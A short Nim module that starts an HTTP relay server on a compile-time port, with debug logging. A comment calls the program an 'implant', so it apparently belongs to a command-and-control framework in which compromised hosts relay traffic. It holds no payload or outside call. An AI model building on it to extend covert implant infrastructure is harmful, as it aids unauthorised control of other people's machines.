#[
    HTTP Relay Server Launcher
    Starts the HTTP relay server if RELAY_PORT is defined at compile time
]#

import asyncdispatch
import http_relay

# Check if RELAY_PORT is defined at compile time
const RELAY_PORT {.intdefine.}: int = 0

# Start HTTP relay server in async mode
proc startRelayServerAsync*() {.async.} =
    when RELAY_PORT > 0:
        when defined debug:
            echo "[RELAY] 🚀 HTTP Relay server configured on port " & $RELAY_PORT
        
        # Start relay server in background (non-blocking)
        try:
            let server = startHttpRelayServer(RELAY_PORT)
            
            if server.isListening:
                when defined debug:
                    echo "[RELAY] ✅ HTTP Relay server running on port " & $RELAY_PORT
            else:
                when defined debug:
                    echo "[RELAY] ❌ Failed to start HTTP Relay server"
                    
        except Exception as e:
            when defined debug:
                echo "[RELAY] ❌ Exception starting relay server: " & e.msg
    else:
        when defined debug:
            echo "[RELAY] ℹ️  No relay server configured (RELAY_PORT not defined)"

# Check if this implant should act as relay server
proc isRelayServer*(): bool =
    when RELAY_PORT > 0:
        return true
    else:
        return false

# Get the relay server port (0 if not configured)
proc getRelayServerPort*(): int =
    when RELAY_PORT > 0:
        return RELAY_PORT
    else:
        return 0
